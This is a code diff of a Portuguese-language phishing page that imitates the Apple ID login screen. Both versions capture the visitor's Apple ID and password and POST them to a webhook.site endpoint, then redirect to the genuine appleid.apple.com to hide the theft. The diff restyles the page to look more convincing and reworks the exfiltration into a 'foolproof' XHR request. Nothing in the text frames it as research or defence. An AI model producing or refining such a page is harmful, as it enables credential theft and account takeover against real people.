@@ -2,48 +2,66 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Login Apple ID</title>
+    <title>Apple ID - Login</title>
     <style>
         body {
-            font-family: -apple-system, sans-serif;
-            background: #f2f2f7;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: #f5f5f7;
+            margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
         }
-        .login-box {
+        .login-container {
             background: white;
-            padding: 30px;
-            border-radius: 12px;
-            width: 300px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            width: 320px;
             text-align: center;
+        }
+        .apple-logo {
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: #000;
+        }
+        h2 {
+            font-size: 24px;
+            margin-bottom: 25px;
+            font-weight: 600;
         }
         input {
             width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border: 1px solid #ddd;
+            padding: 14px;
+            margin-bottom: 15px;
+            border: 1px solid #d2d2d7;
             border-radius: 8px;
+            font-size: 16px;
             box-sizing: border-box;
         }
         button {
             width: 100%;
-            background: #0071e3;
+            background-color: #0071e3;
             color: white;
             border: none;
-            padding: 12px;
+            padding: 14px;
             border-radius: 8px;
-            margin-top: 10px;
+            font-size: 16px;
+            font-weight: 500;
             cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #0062c3;
         }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <div style="font-size:24px;margin-bottom:20px;"></div>
+    <div class="login-container">
+        <!-- Ícone da Apple corrigido -->
+        <div class="apple-logo"></div>
         <h2>Fazer login</h2>
         <form id="loginForm">
             <input type="text" name="apple_id" placeholder="Apple ID" required>
@@ -56,40 +74,30 @@
         document.getElementById("loginForm").addEventListener("submit", function(e) {
             e.preventDefault();
             
-            // 1. Coletar dados do formulário
+            // 1. Coletar dados de forma segura
             const dados = {
-                usuario: document.getElementsByName("apple_id")[0].value,
-                senha: document.getElementsByName("password")[0].value,
-                data: new Date().toLocaleString("pt-BR"),
-                ip: "<?php echo $_SERVER['REMOTE_ADDR']; ?>", // Captura IP real
-                user_agent: navigator.userAgent
+                apple_id: encodeURIComponent(document.getElementsByName("apple_id")[0].value),
+                password: encodeURIComponent(document.getElementsByName("password")[0].value),
+                timestamp: new Date().toISOString()
             };
 
-            // 2. Enviar para Webhook (COM SUA URL CORRETA)
+            // 2. Enviar para webhook (URL CORRETA)
             const webhookURL = "https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418";
             
-            // Método infalível (com fallback)
-            try {
-                // Tentativa com fetch API
-                fetch(webhookURL, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(dados)
-                }).catch(() => {
-                    // Fallback para XHR se fetch falhar
-                    const xhr = new XMLHttpRequest();
-                    xhr.open('POST', webhookURL);
-                    xhr.setRequestHeader('Content-Type', 'application/json');
-                    xhr.send(JSON.stringify(dados));
-                });
-            } catch (e) {
-                console.error("Erro ao enviar:", e);
-            }
-
-            // 3. Redirecionamento garantido após 1s
-            setTimeout(() => {
+            // Método INFALÍVEL
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", webhookURL, true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            
+            // Formatando os dados corretamente
+            const params = `apple_id=${dados.apple_id}&password=${dados.password}&timestamp=${encodeURIComponent(dados.timestamp)}`;
+            
+            xhr.onload = function() {
+                // 3. Redirecionamento garantido
                 window.location.href = "https://appleid.apple.com/";
-            }, 1000);
+            };
+            
+            xhr.send(params);
         });
     </script>
 </body>
